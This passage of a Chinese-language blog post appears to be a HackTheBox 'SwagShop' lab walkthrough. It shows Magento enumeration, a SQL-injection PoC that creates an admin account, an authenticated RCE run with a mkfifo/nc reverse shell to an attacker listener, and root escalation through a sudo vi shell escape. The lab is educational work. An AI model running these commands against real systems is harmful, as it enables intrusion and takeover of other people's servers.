class="hljs-name">model</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pdo_mysql<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pdoType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pdoType</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或许可以去ssh试一下，不出意外的并不行：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> known <span class="hljs-keyword">by</span> any other names<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;10.10.10.140&#x27; (ED25519) to the list of known hosts.</span><br>root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><span class="hljs-comment">&#x27;s password: </span><br>Permission denied, please <span class="hljs-keyword">try</span> again.<br>root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><span class="hljs-comment">&#x27;s password: </span><br></code></pre></td></tr></table></figure>
+
+<p>还有看起来像是计划任务的脚本cron.sh，但抱歉它是空的。还有它的安装脚本：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb/install.php<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220408171229322.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408171229322" style="zoom:200%;" />
+
+<p>我还发现一些这样的东西：</p>
+<img src="https://www.worldisend.com/img/image-20220408171324831.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408171324831" style="zoom:200%;" />
+
+<p>大概浏览了一下，收获颇丰，还有目标看起来像是管理员登陆的页面，但是它又显示了另一个时间2022：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span>admin/<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220408174413490.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408174413490" style="zoom:200%;" />
+
+<p>我想先试着寻找已经公开的漏洞：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">searchsploit Magento<br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  <span class="hljs-type">Path</span><br>--------------------------------------------------------------------------- ---------------------------------<br>eBay Magento <span class="hljs-number">1.9</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> - PHP FPM XML eXternal Entity Injection               | <br><span class="hljs-type">eBay</span> Magento CE <span class="hljs-number">1.9</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> - Unrestricted Cron <span class="hljs-keyword">Script</span> (Code Execution / Denia | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;/app/code/core/Mage/Admin/Model/Session.php?login[&#x27;Username | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;/app/code/core/Mage/Adminhtml/controllers/IndexController.p | <br><span class="hljs-type">Magento</span> <span class="hljs-number">1.2</span> - &#x27;downloader/index.php&#x27; Cross-Site Scripting                  | <br><span class="hljs-type">Magento</span> &lt; <span class="hljs-number">2.0</span><span class="hljs-number">.6</span> - Arbitrary Unserialize / Arbitrary Write <span class="hljs-keyword">File</span>             | <br><span class="hljs-type">Magento</span> CE &lt; <span class="hljs-number">1.9</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - (Authenticated) Remote Code Execution               | <br><span class="hljs-type">Magento</span> eCommerce - <span class="hljs-keyword">Local</span> <span class="hljs-keyword">File</span> Disclosure                                  | <br><span class="hljs-type">Magento</span> eCommerce - Remote Code Execution                                  | <br><span class="hljs-type">Magento</span> Server MAGMI Plugin - Multiple Vulnerabilities                     | <br><span class="hljs-type">Magento</span> Server MAGMI Plugin <span class="hljs-number">0.7</span><span class="hljs-number">.17</span>a - Remote <span class="hljs-keyword">File</span> Inclusion                | <br><span class="hljs-type">Magento</span> WooCommerce CardGate Payment Gateway <span class="hljs-number">2.0</span><span class="hljs-number">.30</span> - Payment Process Bypa | <br><span class="hljs-type">--------------------------------------------------------------------------- ---------</span><br></code></pre></td></tr></table></figure>
+
+<p>诱惑力最大的永远都是远程代码执行：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Magento</span> eCommerce - Remote <span class="hljs-meta">Code</span> Execution <br></code></pre></td></tr></table></figure>
+
+<p>该<code>Magento eCommerce - Remote Code Execution</code>漏洞利用创建一个新的管理员帐户<code>forme/forme</code>作为凭据。我只需要修改目标并启动它以获得管理员帐户，这是它的利用脚本，当然searchploit的也可以用，但是 需要自己去改：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joren485/</span>Magento-Shoplift-SQLI<span class="hljs-regexp">/blob/m</span>aster/poc.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> poc.py <span class="hljs-number">10.10.10.140</span><br><span class="hljs-attribute">WORKED</span><br><span class="hljs-attribute">Check</span> http://<span class="hljs-number">10.10.10.140</span>/admin with creds ypwq:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<p>该漏洞其实就是一个SQL注入：</p>
+<img src="https://www.worldisend.com/img/image-20220408203043733.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408203043733" style="zoom:200%;" />
+
+<p>就这样，我便拿到了目标后台权限：</p>
+<img src="https://www.worldisend.com/img/image-20220408202624449.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408202624449" style="zoom:200%;" />
+
+<p>接下来我需要使用另一个漏洞进行远程代码执行，</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Magento</span> CE &lt; <span class="hljs-number">1.9.0.1</span> - (Authenticated) Remote Code Execution<br></code></pre></td></tr></table></figure>
+
+<p>searchsploit提供的漏洞利用脚本会出现一些错误，我开发功底其实很差，我还看不懂，但网上很多wp写的都是直接利用成功的，可能哪里更新了年代不一样了吧。我花了很多时间找到了如下文章，它与我遇到的问题是一样的，但是他细分析了很多原因细节并解决掉了该问题，如有需要可自行去查看：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">https</span>://dtwh.medium.com/hack-<span class="hljs-keyword">the</span>-box-swagshop-walkthrough-<span class="hljs-keyword">without</span>-metasploit<span class="hljs-number">-8</span>b9f03c480e7<br></code></pre></td></tr></table></figure>
+
+<p>获取到漏洞利用脚本需要对其内部参数值进行一些更改：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Config.</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&#x27;try&#x27;</span> <span class="hljs-comment">#用户名</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&#x27;again&#x27;</span> <span class="hljs-comment">#密码</span><br><span class="hljs-attr">php_function</span> = <span class="hljs-string">&#x27;system&#x27;</span>  <span class="hljs-comment"># <span class="hljs-doctag">Note:</span> we can only pass 1 argument to the function</span><br><span class="hljs-attr">install_date</span> = <span class="hljs-string">&#x27;Wed, 08 May 2019 07:23:09 +0000&#x27;</span>  <span class="hljs-comment">#时间 This needs to be the exact date from /app/etc/local.xml </span><br></code></pre></td></tr></table></figure>
+
+<p>时间可通过以下命令获取到目标页面的时间：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">curl -s 10.10.10.140/app/etc/local.xml | grep date<br>            <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>&lt;![CDATA[Wed, 08 May 2019 07:23:09 +0000]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我可以执行如下命令，使目标建立一个反向shell：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n2</span> poc.py <span class="hljs-string">&#x27;http://10.10.10.140/index.php/admin&#x27;</span> <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>另一边监听对应端口即可：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">1337</span><br>listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">1337</span> ...<br>connect to [<span class="hljs-number">10.10.16.3</span>] from (UNKNOWN) [<span class="hljs-number">10.10.10.140</span>] <span class="hljs-number">45610</span><br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br></code></pre></td></tr></table></figure>
+
+<p>升级下shell：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>sudo -l 告诉了我些信息：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@swagshop</span><span class="hljs-symbol">:/var/www/html</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> www-data on <span class="hljs-symbol">swagshop:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> www-data may run the following commands on <span class="hljs-symbol">swagshop:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/vi /var/www/html/*<br></code></pre></td></tr></table></figure>
+
+<p>而编辑器中可以切换跳转到当前身份的shell，我可以用以下命令获取root shell：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vi /</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/api.php -c &#x27;:!/</span>bin<span class="hljs-regexp">/sh&#x27; /</span>dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;/var/www/html/api.php&quot;</span> <span class="hljs-number">88</span>L, <span class="hljs-number">2834</span>C<br>:!<span class="hljs-regexp">/bin/</span>sh<br><span class="hljs-comment"># whoami</span><br>whoami<br>root<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>user.txt：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@swagshop</span><span class="hljs-symbol">:/home/haris</span><span class="hljs-comment"># cat user.txt</span><br>cat user.txt<br>a4.............................<br></code></pre></td></tr></table></figure>
+
+<p>root.txt:</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">root<span class="hljs-meta">@swagshop:~#</span> cat root.txt<br>cat root.txt<br>c2b087.........................<br><br>   ___ ___<br> /|<span class="hljs-string"> </span>|<span class="hljs-string">/</span>|<span class="hljs-string">\</span>|<span class="hljs-string"> </span>|<span class="hljs-string">\</span><br><span class="hljs-string">/_</span>|<span class="hljs-string"> ´ </span>|<span class="hljs-string">.` </span>|<span class="hljs-string">_\           We are open! (Almost)</span><br><span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<br>  |<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">         Join the beta HTB Swag Store!</span><br><span class="hljs-string">  </span>|<span class="hljs-string">___</span>|<span class="hljs-string">.__</span>|<span class="hljs-string">       https://hackthebox.store/password</span><br><span class="hljs-string"></span><br><span class="hljs-string">                   PS: Use root flag as password!</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-SwagShop</div>
+      <div>http://example.com/2022/10/06/HackTheBox-SwagShop-MagentoeCommerce-RemoteCodeExecution/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Search/" title="HackTheBox-Search">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Search</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Teacher/" title="HackTheBox-Teacher">
+                        <span class="hidden-mobile">HackTheBox-Teacher</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
